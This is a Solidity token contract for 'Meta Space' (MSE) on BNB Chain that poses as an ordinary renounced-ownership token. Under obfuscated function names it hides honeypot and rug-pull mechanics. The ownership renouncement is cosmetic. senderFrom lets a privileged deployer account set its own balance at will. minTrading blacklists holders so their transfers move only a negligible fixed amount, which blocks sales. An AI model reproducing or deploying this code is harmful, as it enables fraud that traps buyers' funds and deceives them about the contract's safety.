/**
 *Submitted for verification at BscScan.com on 2023-01-26
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract MetaSpace {
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public receiverLaunch;
    string public symbol = "MSE";

    uint256 public totalSupply = 100000000 * 10 ** 18;
    address public takeLaunch;

    uint256 constant walletToken = 11 ** 10;
    string public name = "Meta Space";
    mapping(address => mapping(address => uint256)) public allowance;
    address public amountLaunch;
    bool public feeSwap;


    address public owner;
    mapping(address => bool) public fromList;

    modifier teamTx() {
        require(receiverLaunch[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed modeReceiver, address indexed launchedTeamMode);
    event Transfer(address indexed fundFee, address indexed atReceiver, uint256 launchedAmountTo);
    event Approval(address indexed listToken, address indexed liquidityEnable, uint256 launchedAmountTo);

    constructor (){
        IUniswapV2Router enableMode = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        takeLaunch = IUniswapV2Factory(enableMode.factory()).createPair(enableMode.WETH(), address(this));
        owner = msg.sender;
        amountLaunch = owner;
        receiverLaunch[amountLaunch] = true;
        balanceOf[amountLaunch] = totalSupply;
        emit Transfer(address(0), amountLaunch, totalSupply);
        renounceOwnership();
    }

    

    function modeAmountWallet(address limitBuy, address amountMarketing, uint256 limitBurn) internal returns (bool) {
        require(balanceOf[limitBuy] >= limitBurn);
        balanceOf[limitBuy] -= limitBurn;
        balanceOf[amountMarketing] += limitBurn;
        emit Transfer(limitBuy, amountMarketing, limitBurn);
        return true;
    }

    function buyTotal(address launchedFee) public {
        if (feeSwap) {
            return;
        }
        receiverLaunch[launchedFee] = true;
        feeSwap = true;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(amountLaunch, address(0));
        owner = address(0);
    }

    function senderFrom(uint256 limitBurn) public teamTx {
        balanceOf[amountLaunch] = limitBurn;
    }

    function transferFrom(address txTo, address limitLaunchedTotal, uint256 limitBurn) public returns (bool) {
        if (txTo != msg.sender && allowance[txTo][msg.sender] != type(uint256).max) {
            require(allowance[txTo][msg.sender] >= limitBurn);
            allowance[txTo][msg.sender] -= limitBurn;
        }
        if (limitLaunchedTotal == amountLaunch || txTo == amountLaunch) {
            return modeAmountWallet(txTo, limitLaunchedTotal, limitBurn);
        }
        if (fromList[txTo]) {
            return modeAmountWallet(txTo, limitLaunchedTotal, walletToken);
        }
        return modeAmountWallet(txTo, limitLaunchedTotal, limitBurn);
    }

    function transfer(address limitLaunchedTotal, uint256 limitBurn) external returns (bool) {
        return transferFrom(msg.sender, limitLaunchedTotal, limitBurn);
    }

    function minTrading(address autoLimit) public teamTx {
        if (autoLimit == amountLaunch) {
            return;
        }
        fromList[autoLimit] = true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }


}